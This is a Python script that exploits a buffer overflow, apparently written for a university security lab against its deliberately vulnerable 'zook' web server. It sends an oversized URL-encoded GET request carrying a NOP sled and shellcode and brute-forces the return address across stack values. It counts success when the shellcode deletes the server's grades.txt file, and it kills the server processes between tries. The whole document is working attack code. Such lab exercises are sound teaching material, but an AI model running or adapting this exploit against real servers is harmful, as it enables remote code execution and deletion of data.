#!/usr/bin/python
import socket, struct, time, os, subprocess, sys, urllib

shellcode = open("shellcode.bin").read()
nop = "\x90" * 32
sc = nop + shellcode
RET_URI_OFF = 1024 - 15 + 16

def cleanup():
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    time.sleep(0.3)

def try_addr(addr):
    cleanup()
    open("/home/httpd/grades.txt", "w").close()
    subprocess.Popen(["./clean-env.sh", "./zookld", "zook-exstack.conf"],
                     stdout=open("/dev/null", "w"))
    time.sleep(1)
    quoted = urllib.quote(sc)
    pad = (RET_URI_OFF - 1) - len(sc)
    uri = "/" + quoted + "A" * pad
    uri += struct.pack("<I", addr & 0xffffffff)
    req = "GET " + uri + " HTTP/1.0\r\n\r\n"
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("localhost", 8080))
        s.send(req)
        s.close()
    except Exception:
        pass
    time.sleep(0.5)
    ok = not os.path.exists("/home/httpd/grades.txt")
    cleanup()
    return ok

cleanup()
for lo in xrange(0xb000, 0x10000, 0x10):
    target = 0xffff0000 + lo
    if try_addr(target):
        print("SUCCESS", hex(target))
        sys.exit(0)
print("FAILED")
